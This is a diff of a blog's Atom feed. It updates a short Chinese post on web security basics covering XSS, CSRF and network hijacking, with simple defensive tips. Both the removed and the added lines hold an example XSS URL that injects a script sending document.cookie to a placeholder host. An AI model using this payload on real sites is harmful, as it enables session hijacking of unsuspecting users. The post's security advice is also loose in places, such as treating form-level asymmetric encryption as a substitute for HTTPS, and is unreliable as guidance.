@@ -54,13 +54,12 @@
     <link href="http://yoursite.com/2017/02/10/web%E5%AE%89%E5%85%A8%E6%B5%85%E8%B0%88/"/>
     <id>http://yoursite.com/2017/02/10/web安全浅谈/</id>
     <published>2017-02-10T13:33:22.000Z</published>
-    <updated>2017-07-18T13:47:32.043Z</updated>
+    <updated>2017-07-19T04:07:25.452Z</updated>
     
     <content type="html"><![CDATA[<p>​       大学的时候方向偏网络，考了ccna，并且准备往ie发展的时候，一次偶然的机会微软培训机会让我接触了前端。虽然从事前端行业时间不算很长，但是，，额，还是来聊聊安全吧 ，没有但是#-#</p>
 <a id="more"></a>
 <h3 id="1-XXX跨站脚本攻击"><a href="#1-XXX跨站脚本攻击" class="headerlink" title="1.XXX跨站脚本攻击"></a>1.XXX跨站脚本攻击</h3><p>个人感觉这种理解起来简直通俗易懂，可以通过script，img的src，url地址栏等可以发送请求的地方发送 一段可以执行的代码达到攻击者（都不想说这是黑客，我心目中的黑客应该是叼叼的）的目的。</p>
-<pre><code>举个简单的例子：让别人人点击这个地址，通过qq群，垃圾邮件等等手段
-</code></pre><p>abc.com/search?name=<script>document.location=’<a href="http://abc/get?cookie=&#39;+document.cookie">http://abc/get?cookie=&#39;+document.cookie</a></script></p>
+<p>   举个简单的例子：让别人人<br>   点击这个地址，通过qq群，垃圾邮件等等手段<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">abc.com/search?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=http:<span class="string">'//abc/get?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
 <p>这样就可以获取别人的cookie信息了<br>所以写页面的时候要注意这些，规避这些。<br>1.页面上不要有表单元素能解析html的，记得全都解析成字符串<br>2.能从url获取的信息的，建议由后台获取，前端转义再输出比较好</p>
 <h3 id="2-CSRF攻击"><a href="#2-CSRF攻击" class="headerlink" title="2.CSRF攻击"></a>2.CSRF攻击</h3><p>  CSRF（Cross-site request forgery跨站请求伪造）<br>   其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。<br>具体的代码就不附了，知道意思就行了。</p>
 <h3 id="3-网络劫持攻击"><a href="#3-网络劫持攻击" class="headerlink" title="3.网络劫持攻击"></a>3.网络劫持攻击</h3><p>  这种是你的数据传送的过程被劫持了嘛，比如连不安全的wifi，或者数据经过某条被不法分子监听的链路被劫持。这种最好的方法是https进行加密，ssl协议没大毛病，不过要钱，散户就别去整了，除非你的站点是特别有价值的。<br>   其实做表单提交的时候 只要做非对称加密就可以了，ssh嘛，也没毛病，数据劫持了也没关系，坏人们解析不了。</p>
